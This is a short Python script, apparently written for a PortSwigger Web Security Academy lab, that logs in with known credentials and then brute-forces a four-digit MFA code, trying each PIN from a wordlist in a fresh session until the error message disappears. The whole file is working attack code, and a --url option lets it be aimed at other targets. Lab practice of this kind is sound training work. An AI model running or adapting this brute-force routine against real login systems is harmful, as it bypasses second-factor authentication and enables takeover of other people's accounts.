"""
This script is for multifactor authentification. 
This script logins in first as user and then bruteforces the 4 digits pin.
"""

#!/usr/bin/env python3
import re
import requests
import sys
import argparse

#initialisation of variables
host = 'https://ac131ff61e0b313d802e070900e3007d.web-security-academy.net'
login_url = host + '/login'
pin_url = host + '/login2'
username = 'carlos'
password = 'montoya'
wordlist = []
filePath = "/home/kali/Documents/crunch-wordlist/4-digit-pin-list.txt"

def loginUser(username, password, session):
    login_page = session.get(login_url)    

    dataCorrect = {
        'username': username,
        'password': password
    }
    
    login_result = session.post(login_url, data = dataCorrect, allow_redirects = True)
    return login_result 

def providePin(pin, session):
    session.get(pin_url, allow_redirects = True)
    data = {
        'mfa-code': pin
    }
    
    result = session.post(pin_url, data = data, allow_redirects = True)
    return result 

# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url

# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate pins from file
for p in lines:
    wordlist.append(p)
f.close()

# iterating over pin
for pin in wordlist:
    session = requests.Session()
    #session.proxies={'http': 'https://localhost:8080'}

    pin = pin.rstrip()
    print('[*] Trying pin: "{p}"'.format(p = pin))
    
    loginUser(username, password, session)
    result = providePin(pin, session)
    if 'Incorrect security code' not in result.text:
        print("pin found for " + username + ": " + pin) 
        sys.exit()